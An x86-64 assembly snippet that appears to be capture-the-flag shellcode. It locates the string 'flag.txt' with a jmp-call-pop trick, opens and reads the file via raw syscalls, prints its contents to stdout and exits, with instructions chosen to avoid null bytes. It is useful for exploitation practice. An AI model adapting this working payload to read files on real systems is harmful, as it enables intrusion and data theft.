global _start
section .text
_start:
jmp _push_filename
_readfile:
xor rdi, rdi
add rdi, -100
pop rsi ; pop path value
xor rax, rax
add rax, 257
xor rdx, rdx ; set O_RDONLY flag
syscall
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
xor rax, rax
add al, 60
syscall
_push_filename:
call _readfile
path: db "flag.txt",0
